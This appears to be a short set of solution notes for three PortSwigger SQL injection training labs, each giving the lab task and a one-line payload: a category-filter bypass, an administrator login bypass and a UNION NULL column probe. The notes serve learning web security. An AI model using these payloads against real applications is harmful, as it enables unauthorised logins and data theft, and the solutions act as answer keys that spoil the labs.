# SQL INJECTION

## LAB 1

This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.


**SOLUTION**
```
filter?category=%27+OR+1=1--
```


## LAB 2 

This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.

**SOLUTION**
```
' or 1=1 --
```

## LAB 3

[SQL INJECTION Union](https://portswigger.net/web-security/sql-injection/union-attacks)
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

**SOLUTION**

```
' UNION SELECT NULL,NULL,NULL--
```